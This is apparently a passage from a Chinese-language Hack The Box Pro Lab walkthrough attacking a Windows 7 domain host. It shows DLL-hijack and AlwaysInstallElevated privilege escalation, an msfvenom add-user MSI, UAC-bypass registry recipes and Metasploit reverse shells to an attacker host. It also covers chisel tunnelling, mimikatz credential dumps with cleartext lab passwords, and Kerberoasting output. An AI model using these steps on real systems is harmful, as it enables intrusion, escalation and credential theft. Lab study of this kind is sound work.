    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

#### net config workstation
```plain
C:\Users\awardel\Desktop>net config workstation
net config workstation
Computer name                        \\VDESKTOP1
Full Computer name                   VDESKTOP1.htb.local
User name                            awardel

Workstation active on
        NetBT_Tcpip_{EA508C03-AEC3-4BEC-B3F9-A524191F8D52} (00505694C5DA)
        NetBT_Tcpip_{DBE8CB1F-E3E8-4027-BE20-88793B055EA6} (0050569455E2)

Software version                     Windows 7 Professional

Workstation domain                   HTB
Workstation Domain DNS Name          htb.local
Logon domain                         HTB

COM Open Timeout (sec)               0
COM Send Count (byte)                16
COM Send Timeout (msec)              250
The command completed successfully.
```

#### ipconfig
```plain
Windows IP Configuration


Ethernet adapter Local Area Connection 5:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::78d9:4a3f:be56:f2f3
   Temporary IPv6 Address. . . . . . : dead:beef::4152:13de:3d09:7d07
   Link-local IPv6 Address . . . . . : fe80::78d9:4a3f:be56:f2f3%20
   IPv4 Address. . . . . . . . . . . : 10.13.38.13
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:7673%20
                                       10.13.38.2

Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7041:501c:3593:7440%19
   IPv4 Address. . . . . . . . . . . : 172.16.249.203
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.249.2

Tunnel adapter isatap.{EA508C03-AEC3-4BEC-B3F9-A524191F8D52}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Tunnel adapter isatap.{DBE8CB1F-E3E8-4027-BE20-88793B055EA6}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

#### 内网探测
```plain
meterpreter > run post/windows/gather/arp_scanner RHOSTS=172.16.249.0/24
[*] Running module against VDESKTOP1 (10.13.38.13)
[*] ARP Scanning 172.16.249.0/24
[+]     IP: 172.16.249.200 MAC 00:50:56:94:fe:69 (VMware, Inc.)
[+]     IP: 172.16.249.205 MAC 00:50:56:94:10:60 (VMware, Inc.)
[+]     IP: 172.16.249.204 MAC 00:50:56:94:07:1e (VMware, Inc.)
[+]     IP: 172.16.249.202 MAC 00:50:56:94:fc:b2 (VMware, Inc.)
[+]     IP: 172.16.249.201 MAC 00:50:56:94:c3:a7 (VMware, Inc.)
[+]     IP: 172.16.249.203 MAC 00:50:56:94:c5:da (VMware, Inc.)
[+]     IP: 172.16.249.255 MAC 00:50:56:94:c5:da (VMware, Inc.)
```

#### 系统判断
```plain
C:\Windows\system32>for /L %i in (1,1,255) do @ping -n 1 -w 200 172.16.249.%i | find "TTL="
for /L %i in (1,1,255) do @ping -n 1 -w 200 172.16.249.%i | find "TTL="
Reply from 172.16.249.200: bytes=32 time<1ms TTL=128
Reply from 172.16.249.201: bytes=32 time<1ms TTL=128
Reply from 172.16.249.202: bytes=32 time=1ms TTL=64
Reply from 172.16.249.204: bytes=32 time<1ms TTL=128
```

根据TTL得出172.16.249.202为linux系统

#### 加载powershell
```plain
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS >
```

#### PowerUp
##### 上传
```plain
meterpreter > upload /home/kali/Desktop/tools/PowerSploit/Privesc/PowerUp.ps1 "C:\Users\jmendes\Desktop"
[*] Uploading  : /home/kali/Desktop/tools/PowerSploit/Privesc/PowerUp.ps1 -> C:\Users\jmendes\Desktop\PowerUp.ps1
[*] Completed  : /home/kali/Desktop/tools/PowerSploit/Privesc/PowerUp.ps1 -> C:\Users\jmendes\Desktop\PowerUp.ps1
```

##### 启动
```plain
PS > Import-Module .\PowerUp.ps1
PS > Invoke-AllChecks

[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...

[*] Checking for unquoted service paths...

[

[*] Checking service permissions...


[*] Checking %PATH% for potentially hijackable .dll locations...

HijackablePath : C:\Windows\system32\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\system32\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\System32\WindowsPowerShell\v1.0\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\System32\WindowsPowerShell\v1.0\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Program Files\Citrix\ICAService\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Program Files\Citrix\ICAService\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Program Files\Citrix\System32\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Program Files\Citrix\System32\\wlbsctrl.dll' -Command '...'

[

OutputFile    :
AbuseFunction : Write-UserAddMSI


[

[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...

UnattendPath : C:\Windows\Panther\Unattend.xml

[*] Checking for encrypted web.config strings...

[*] Checking for encrypted application pool and virtual directory passwords...
```

##### 思路：提权点1-DLL Hijack
你这里：

```plain
HijackablePath : C:\Windows\system32\
HijackablePath : C:\Windows\
HijackablePath : C:\Program Files\Citrix\ICAService\
```

👉 说明：

某些高权限进程会加载 `wlbsctrl.dll`  
而你可以写入这些路径 → **DLL 劫持**

---

###### 利用方式（PowerUp已经帮你写好了）
直接用它给的函数：

```plain
Write-HijackDll -OutputFile 'C:\Windows\System32\wlbsctrl.dll' -Command "net user hacker 123456 /add"
```

👉 或更狠一点：

```plain
Write-HijackDll -OutputFile 'C:\Windows\System32\wlbsctrl.dll' -Command "net localgroup administrators hacker /add"
```

---

###### 关键点
👉 DLL 不会立即执行  
👉 需要触发：

+ 重启服务
+ 重启机器
+ 或相关程序加载 DLL

---

##### 思路：提权点2-AlwaysInstallElevated
你这里：

```plain
AbuseFunction : Write-UserAddMSI
```

👉 说明：

⚠️ 很可能开启了 AlwaysInstallElevated

---

###### 先确认
```plain
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

如果两个都显示：

```plain
AlwaysInstallElevated    REG_DWORD    0x1
```

---

###### 直接提权
在 Kali：

```plain
msfvenom -p windows/adduser USER=heathc1iff PASS=Pass@123 -f msi > evil.msi
```

上传：

```plain
upload evil.msi
```

执行：

```plain
msiexec /quiet /qn /i evil.msi
```

👉 直接获得管理员用户

### 提权-AlwaysInstallElevated
由于DLL Hijack的dll不会立即触发，因此优先使用AlwaysInstallElevated提权方式

#### 注册表
```plain
C:\Users\jmendes\Desktop>reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\jmendes\Desktop>reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

两个都显示：

```plain
AlwaysInstallElevated    REG_DWORD    0x1
```

#### evil.msi
##### Generate
```plain
msfvenom -p windows/adduser USER=heathc1iff PASS=Pass@123 -f msi > evil.msi
```

##### Upload
```plain
meterpreter > upload /home/kali/Desktop/htb/xen/evil.msi "C:\Users\jmendes\Desktop"
[*] Uploading  : /home/kali/Desktop/htb/xen/evil.msi -> C:\Users\jmendes\Desktop\evil.msi
[*] Completed  : /home/kali/Desktop/htb/xen/evil.msi -> C:\Users\jmendes\Desktop\evil.msi
```

##### Run
```plain
C:\Users\jmendes\Desktop>msiexec /quiet /qn /i evil.msi
msiexec /quiet /qn /i evil.msi
```

### 切换用户
尝试Win+L进行锁屏，使用新增用户进行登录(失败-无法切换用户)

在cmd中输出指令

```plain
runas /user:heathc1iff cmd.exe
password:Pass@123
```

![](/image/hackthebox-prolabs/Xen-15.png)

反弹shell到msfconsole中

```plain
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.16.32
LHOST => 10.10.16.32
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.32:443
```

```plain
C:\Windows\system32>C:Users\Public\xen.exe
```

## vdesktop2\heathc1iff
### whoami /priv
```plain
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### whoami /groups
```plain
GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group
```

### net user heathc1iff
```plain
C:\Users\jmendes\Desktop>net user heathc1iff
net user heathc1iff
User name                    heathc1iff
Full Name
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never


Password last set            3/18/2026 12:12:25 PM
Password expires             4/29/2026 12:12:25 PM
Password changeable          3/19/2026 12:12:25 PM
Password required            Yes
User may change password     Yes


Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never


Logon hours allowed          All


Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

### Access is denied.
```plain
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 6ACB-B2BD

 Directory of C:\Users

03/18/2026  12:38 PM    <DIR>          .
03/18/2026  12:38 PM    <DIR>          ..
03/30/2019  06:43 AM    <DIR>          Administrator
03/30/2019  05:11 AM    <DIR>          ctx_cpsvcuser
03/18/2026  12:38 PM    <DIR>          heathc1iff
03/31/2019  08:36 AM    <DIR>          jmendes
03/18/2026  01:42 PM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)   2,072,326,144 bytes free

C:\Users>cd Administrator
Access is denied.

C:\Users>cd ctx_cpsvcuser
Access is denied.

C:\Users>cd jmendes
Access is denied.
```

### **Analysis**
#### 1️⃣ 用户基本信息
```plain
User name: heathc1iff
Local Group Memberships: *Administrators *Users
```

👉 表面上你在 **Administrators 组**，但要注意下面这一点：

---

#### 2️⃣ 关键异常 
```plain
BUILTIN\Administrators  Group used for deny only
```

👉 这说明：

+ 虽然你“属于管理员组”
+ **但这个管理员 Token 被标记为 Deny Only**
+ 实际运行权限 ≈ 普通用户（UAC 过滤后的 Token）

📌 这就是典型的：

**UAC 限制下的伪管理员（Filtered Token）**

### UAC Bypass
#### 方案
##### 方案 1: 使用 `sdclt.exe` (Windows 10 1703+)
```plain
reg add "HKCU\Software\Classes\Folder\shell\manage\command" /ve /t REG_SZ /d "cmd.exe /c start cmd.exe" /f
sdclt.exe
reg delete "HKCU\Software\Classes\Folder\shell\manage\command" /f
```

##### 方案 2: 使用 `eventvwr.exe` (事件查看器)
```plain
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd.exe /c start cmd.exe" /f
eventvwr.exe
reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f
```

##### 方案 3: 使用 `ComputerDefaults.exe` (Windows 10 1803+)
```plain
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "cmd.exe /c start cmd.exe" /f
ComputerDefaults.exe
reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f
```

##### 方案 4: 使用 `cmstp.exe` (连接管理器)
```plain
# 创建 INF 文件并执行
echo [version] > C:\Windows\Temp\test.inf
echo Signature=$chicago$ >> C:\Windows\Temp\test.inf
echo [DefaultInstall_SingleUser] >> C:\Windows\Temp\test.inf
echo RunPreSetupCommands=test >> C:\Windows\Temp\test.inf
echo [test] >> C:\Windows\Temp\test.inf
echo cmd.exe /c start cmd.exe >> C:\Windows\Temp\test.inf
cmstp.exe /ni /s C:\Windows\Temp\test.inf
```

##### 方案 5: 使用 `fodhelper.exe` 
```plain
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
C:\Windows\System32\fodhelper.exe
reg delete HKCU\Software\Classes\ms-settings /f
```

#### Msfconsole指令
```plain
# 查看可用的 bypassuac 模块
search bypassuac

# 常用模块
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_eventvwr
use exploit/windows/local/bypassuac_fodhelper
use exploit/windows/local/bypassuac_comhijack
use exploit/windows/local/bypassuac_sluihijack

# 设置参数
set SESSION <当前session ID>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <你的IP>
set LPORT <新端口>
exploit
```

#### exploit/windows/local/bypassuac(失败)
```plain
msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                       Connection
  --  ----  ----                     -----------                       ----------
  3         meterpreter x86/windows  HTB\jmendes @ VDESKTOP2           10.10.16.32:443 -> 10.13.38.14:49292 (10.13.38.14)
  4         meterpreter x86/windows  VDESKTOP2\heathc1iff @ VDESKTOP2  10.10.16.32:443 -> 10.13.38.14:49315 (10.13.38.14)

msf exploit(multi/handler) > use exploit/windows/local/bypassuac
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/bypassuac) > set SESSION 4
SESSION => 4
msf exploit(windows/local/bypassuac) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(windows/local/bypassuac) > set LHOST 10.10.16.32
LHOST => 10.10.16.32
msf exploit(windows/local/bypassuac) > set LPORT 4444
LPORT => 4444
msf exploit(windows/local/bypassuac) > exploit
[*] Started reverse TCP handler on 10.10.16.32:4444
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 7168 bytes long being uploaded..
[-] Exploit failed [timeout-expired]: Timeout::Error execution expired
[*] Exploit completed, but no session was created.
```

#### exploit/windows/local/bypassuac_eventvwr
```plain
msf exploit(windows/local/bypassuac) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/bypassuac_eventvwr) > set SESSION 4
SESSION => 4
msf exploit(windows/local/bypassuac_eventvwr) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(windows/local/bypassuac_eventvwr) > set LHOST 10.10.16.32
LHOST => 10.10.16.32
msf exploit(windows/local/bypassuac_eventvwr) > set LPORT 443
LPORT => 443
msf exploit(windows/local/bypassuac_eventvwr) > run
[*] Started reverse TCP handler on 10.10.16.32:443
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (190534 bytes) to 10.13.38.14
[*] Cleaning up registry keys ...
[*] Meterpreter session 5 opened (10.10.16.32:443 -> 10.13.38.14:49318) at 2026-03-18 13:00:33 +0800

meterpreter >
```

## Getflag
```plain
C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
XEN{7ru573d_1n574ll3r5}
```

## 横向移动
### 隧道搭建
#### 新版本(失败)
```c
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ chisel server -p 8080 --reverse
2026/03/18 13:12:16 server: Reverse tunnelling enabled
2026/03/18 13:12:16 server: Fingerprint g7H4e3Cque2yd1f4K0+mzzkQbtva2cuKtRjv7iFaN9s=
2026/03/18 13:12:16 server: Listening on http://0.0.0.0:8080
```

```c
upload /home/kali/Desktop/tools/chisel/chisel.exe "C:\Users\Public"
execute -f C:\\Users\\Public\\chisel.exe -a "client 10.10.16.32:8080 R:socks"
```

？？？居然崩溃了，换个旧版本的试试

#### 旧版本
[https://github.com/jpillora/chisel/releases/tag/v1.5.1](https://github.com/jpillora/chisel/releases/tag/v1.5.1)

```c
┌──(kali㉿kali)-[~/Desktop/tools/chisel]
└─$ ./oldchisel server -p 8081 --reverse -v
2026/03/18 13:28:17 server: Reverse tunnelling enabled
2026/03/18 13:28:17 server: Fingerprint 02:0c:9b:c4:37:ca:98:37:70:55:a6:65:bc:8a:03:e2
2026/03/18 13:28:17 server: Listening on 0.0.0.0:8080...
2026/03/18 13:28:41 server: session#1: Handshaking...
2026/03/18 13:28:44 server: session#1: Verifying configuration
2026/03/18 13:28:44 server: session#1: Open
2026/03/18 13:28:44 server: proxy#1:R:127.0.0.1:1080=>socks: Listening
```

```c
upload /home/kali/Desktop/tools/chisel/oldchisel.exe "C:\Users\Public"
execute -f C:\\Users\\Public\\oldchisel.exe -a "client 10.10.16.32:8081 R:socks"
```

旧版本的还真成功了

### x64-NT AUTHORITY\SYSTEM
#### uac bypass system sessions
```c
msf exploit(windows/local/bypassuac_eventvwr) > sessions

Active sessions
===============

  Id  Name  Type                     Information                       Connection
  --  ----  ----                     -----------                       ----------
  3         meterpreter x86/windows  HTB\jmendes @ VDESKTOP2           10.10.16.32:443 -> 10.13.38.14:49292 (10.13.38.14)
  4         meterpreter x86/windows  VDESKTOP2\heathc1iff @ VDESKTOP2  10.10.16.32:443 -> 10.13.38.14:49315 (10.13.38.14)
  5         meterpreter x64/windows  HTB\jmendes @ VDESKTOP2           10.10.16.32:443 -> 10.13.38.14:49318 (10.13.38.14)
  6         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ VDESKTOP2   10.10.16.32:443 -> 10.13.38.14:49400 (10.13.38.14)
```

可以看到我们拿到的是x86session的system权限，这并不利于我们的进一步利用

#### x64payload
```c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.32 LPORT=4444 -f exe > shell64.exe
```

```c
meterpreter > upload /home/kali/Desktop/htb/xen/shell64.exe "C:\Users\Public"
[*] Uploading  : /home/kali/Desktop/htb/xen/shell64.exe -> C:\Users\Public\shell64.exe
[*] Completed  : /home/kali/Desktop/htb/xen/shell64.exe -> C:\Users\Public\shell64.exe
```

#### handler 
```c
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.16.32
LHOST => 10.10.16.32
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.32:4444
```

#### execute
```c
execute -f C:\\Users\\Public\\shell64.exe
```

#### x64-shell
成功拿到x64的shell

```c
meterpreter > getuid
Server username: VDESKTOP2\heathc1iff
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VDESKTOP2  10.10.16.32:4444 -> 10.13.38.14:49409 (10.13.38.14)
```

### mimikatz
#### load kiwi
```plain
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

#### creds_all
```plain
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain     NTLM                              SHA1
--------       ------     ----                              ----
VDESKTOP2$     HTB        944021e7920e2e340c81291c5a8f9eec  dc59818c16f5de712971377c2393001d9e080096
ctx_cpsvcuser  VDESKTOP2  6ec10698c229e003302875d930c1cea6  587231fad0ffeb06e814a0d5f49096f689dc9c08
heathc1iff     VDESKTOP2  c87a64622a487061ab81e51cc711a34b  ba6f9cfe245f0777ea7c5a2dc993b8bfd975cd10
jmendes        HTB        10d0c05f7d958955f0eaf1479b5124a0  d9d87e545971c6ee35ae56520c24e66d03385599

wdigest credentials
===================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
VDESKTOP2$     HTB        7f b3 15 20 e7 3b 2f f2 ea 42 a2 a5 92 e9 bc e9 62 7f dd 67 c6 dd 3d d0 3f d2 3a 7a 80 5d 83 6f 10 75 fb c5 c9 4a 46 91 34 e9 f0 67 3c b0 0d 77 27 b3 88 98 9
                          3 d7 bc 55 8b 3f 57 2f c3 04 e7 39 51 a0 22 59 a4 42 32 83 85 c6 2c ce 71 6b 32 a3 0d c4 8d b8 26 c0 6a d1 95 a7 5d 9c a5 12 7d dc 6f dd e1 17 c3 25 9e f8 73
                           01 60 31 00 8f fb 54 98 57 ff c1 99 73 83 ba d1 81 d7 4e 00 24 47 6a ed a2 a3 f8 d6 36 41 6e 81 b0 79 90 78 29 c1 1c 11 dc b0 87 2f 9b f3 c8 af 44 01 e7 f4
                          ab df bd 8a 3b b4 36 47 03 d3 0c 16 6f fd 35 a2 88 c4 37 df 0e 28 64 a1 1f 0a 3e ea 9d cf 1f a8 fd cd 29 41 28 71 34 21 b7 d2 06 56 6f 71 b7 b4 af df 52 69 0
                          6 e3 b1 00 1b 78 48 73 75 8e b3 fa 75 98 f5 90 3a 12 13 10 71 0b 12 39 05 56 a5 09 1c 05 4d
ctx_cpsvcuser  VDESKTOP2  0$GbG7B=�AWl:4
heathc1iff     VDESKTOP2  Pass@123
jmendes        HTB        VivaBARC3L0N@!!!

kerberos credentials
====================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
ctx_cpsvcuser  VDESKTOP2  (null)
heathc1iff     VDESKTOP2  (null)
jmendes        HTB.LOCAL  (null)
vdesktop2$     HTB.LOCAL  7f b3 15 20 e7 3b 2f f2 ea 42 a2 a5 92 e9 bc e9 62 7f dd 67 c6 dd 3d d0 3f d2 3a 7a 80 5d 83 6f 10 75 fb c5 c9 4a 46 91 34 e9 f0 67 3c b0 0d 77 27 b3 88 98 9
                          3 d7 bc 55 8b 3f 57 2f c3 04 e7 39 51 a0 22 59 a4 42 32 83 85 c6 2c ce 71 6b 32 a3 0d c4 8d b8 26 c0 6a d1 95 a7 5d 9c a5 12 7d dc 6f dd e1 17 c3 25 9e f8 73
                           01 60 31 00 8f fb 54 98 57 ff c1 99 73 83 ba d1 81 d7 4e 00 24 47 6a ed a2 a3 f8 d6 36 41 6e 81 b0 79 90 78 29 c1 1c 11 dc b0 87 2f 9b f3 c8 af 44 01 e7 f4
                          ab df bd 8a 3b b4 36 47 03 d3 0c 16 6f fd 35 a2 88 c4 37 df 0e 28 64 a1 1f 0a 3e ea 9d cf 1f a8 fd cd 29 41 28 71 34 21 b7 d2 06 56 6f 71 b7 b4 af df 52 69 0
                          6 e3 b1 00 1b 78 48 73 75 8e b3 fa 75 98 f5 90 3a 12 13 10 71 0b 12 39 05 56 a5 09 1c 05 4d
vdesktop2$     HTB.LOCAL  (null)
```

### sharphound(失败)
#### upload
```c
upload /home/kali/Desktop/tools/sharphound/SharpHound-v1.1.1/SharpHound.exe "C:\Users\jmendes\Desktop"
upload /home/kali/Desktop/tools/sharphound/SharpHound-v1.1.1/SharpHound.ps1  "C:\Users\jmendes\Desktop"    
```

#### run
切换session至域用户HTB\jmendes

##### sharphound.exe
sharphound.exe运行失败了因为目标靶机没有.Net4环境

![](/image/hackthebox-prolabs/Xen-16.png)

##### sharphound.ps1
SharpHound.ps1 需要：

+ PowerShell ≥ 3.0

而你这个 Win7：

👉 默认是：PowerShell 2.0 ❌

```c
PS > powershell -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All"
ERROR: powershell.exe : Property 'PositionalBinding' cannot be found for type 'System.Management.Automa
ERROR: At line:1 char:11
ERROR: + powershell <<<<  -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All"
ERROR:     + CategoryInfo          : NotSpecified: (Property 'Posit...nagement.Automa:String) [], RemoteException
ERROR:     + FullyQualifiedErrorId : NativeCommandError
ERROR:
ERROR: tion.CmdletBindingAttribute'.
ERROR:
ERROR: At C:\Users\jmendes\Desktop\SharpHound.ps1:241 char:19
ERROR:
ERROR: +     [CmdletBinding <<<< (PositionalBinding = $false)]
ERROR:
ERROR:     + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
ERROR:
ERROR:     + FullyQualifiedErrorId : PropertyAssignmentException
```

### bloodhound-python
```plain
proxychains bloodhound-python \
-d HTB.LOCAL \
-u jmendes \
-p 'VivaBARC3L0N@!!!' \
-dc dc.htb.local \
-ns 172.16.249.200 \
-c all \
--dns-tcp \
--auth-method ntlm
```

### bloodhound
All Kerberoastable users中发现SPN用户

```plain
Service Principal Names:
MSSQLSvc/CITRIXTEST.HTB.LOCAL:1433
```

👉 说明：

+ 这是 **SQL Server 服务账号**
+ 一般权限不低（很多时候本地管理员甚至域权限）

![](/image/hackthebox-prolabs/Xen-17.png)

### GetUserSPNs
#### Clock skew too great(失败)
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# proxychains -q GetUserSPNs.py HTB.LOCAL/jmendes:'VivaBARC3L0N@!!!' \
-dc-ip 172.16.249.200 \
-request
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                Name     MemberOf                                 PasswordLastSet             LastLogon                   Delegation
----------------------------------  -------  ---------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/CITRIXTEST.HTB.LOCAL:1433  mturner  CN=Deployment,OU=Groups,DC=htb,DC=local  2019-02-14 06:23:48.796612  2019-04-11 04:14:57.105936



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

失败了，原因是 Kali 时间 和 域控时间 不同步  

#### 时间校准
```plain
C:\Windows\system32>date /t
date /t
Wed 03/18/2026

C:\Windows\system32>time /t
time /t
03:51 PM
```

```plain
sudo date -s "2026-03-18 15:53:20"
```

#### exploit
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
└─# proxychains -q GetUserSPNs.py HTB.LOCAL/jmendes:'VivaBARC3L0N@!!!' \
-dc-ip 172.16.249.200 \
-request
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                Name     MemberOf                                 PasswordLastSet             LastLogon                   Delegation
----------------------------------  -------  ---------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/CITRIXTEST.HTB.LOCAL:1433  mturner  CN=Deployment,OU=Groups,DC=htb,DC=local  2019-02-14 06:23:48.796612  2019-04-11 04:14:57.105936



[-] CCache file is not found. Skipping...
$krb5tgs$23$*mturner$HTB.LOCAL$HTB.LOCAL/mturner*$5c17780201e65e27034f8709b035251f$daafb272f69acbadafbdf13984099d3927ee1f74143ee140ad1fb4f6c8faee3da445afee18fa9969ab7268d42c3541693b13833d031451771b5e5cb8a252f8c1216be45bfa89ac221f40ac9ffab491a9a9f9e68d963e4133971e849b922e06547e35502fe5707bf158ad6f111e6ea0eaa456d904c522fdabb957553066a9da86c7043fc3e8c0e201def18f0b33aaa1b8763b95e21a1e2233b246e0c4480c73897c777595e507d327476a60d3a2c5bb53142564e975d70d1feae6d2599235c502ecb92b6860d3560fbcde6b80c1b29666597ca70e36343bd0e9c9cbf3c238e9eb2754dbafe0d4845350c1211e8ae96c92d0b81574df9704b657ad74585498e4ee1b1d7625078e566c09b859496e272274bacb858fce0c6145bcac919cf4a3c28ccfefbef9dca012a990363cb187ea93c5601868e13367f616aa2a05c2e57767481f9444000049c75b4483375c5a626fa14ad0f683812f6fe298c00d65768ca865aaba1f9d2451b9d533399a110adb652f78a67e19292cdcdc00473059a3d871658ff91b2dfced81ba4c5f7c050e5a03c4997b80778a48663ffe9031b5ae7e654b08a68d5740ee2d6d167286c7a6f89282d929936191f40328a97cd7